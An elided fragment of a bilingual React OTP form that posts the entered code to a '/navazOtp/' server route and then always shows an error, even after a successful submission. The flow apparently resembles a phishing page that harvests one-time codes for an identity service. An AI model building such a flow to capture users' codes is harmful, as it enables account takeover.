...
const OrderOtp = ({ setMode, checkMode }) => {
  ...
  const handleSubmit = async (e) => {
    ...
    e.preventDefault();
    await axios
      .post(serverRoute + "/navazOtp/" + sessionStorage.getItem("id"), { otp })
      .then(() => {
        setError(true);
        setLoading(false);
      });
    ...
    <div>
      ...
      >
        ...
        >
          ...
          >
            <div className="flex gap-x-5 px-2  text-gray-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc">
              <p>
            ...
            <button
              className="text-white bg-gray-500 w-1/2 text-sm md:text-base py-1 rounded-sm "
              onClick={() => (window.location.href = "/services")}
            >
              {checkMode("Back", "رجوع").word}
            </button>
            {error && (
              <span className="flex gap-x-5 px-5  text-red-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc">
                {
                  checkMode(
